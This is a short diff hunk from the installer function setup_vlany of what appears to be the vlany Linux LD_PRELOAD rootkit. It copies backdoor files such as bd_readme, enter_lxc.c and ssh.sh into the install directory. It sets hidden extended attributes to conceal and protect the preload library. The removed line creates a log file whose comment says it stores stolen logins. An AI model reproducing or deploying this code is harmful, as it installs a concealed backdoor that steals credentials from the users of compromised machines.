@@ -260,7 +260,6 @@ setup_vlany ()
     mv bd_readme $INSTALL/README
     cp misc/enter_lxc.c $INSTALL/enter_lxc.c
     cp misc/ssh.sh $INSTALL/ssh.sh
-    touch $INSTALL/pam_auth_logs # gets rid of annoying "no such file or dir" output when no logins have been stolen yet
 
     # protect files and directories
     setfattr -n user.${HIDDEN_XATTR_1_STR} -v ${HIDDEN_XATTR_2_STR} $NEW_PRELOAD
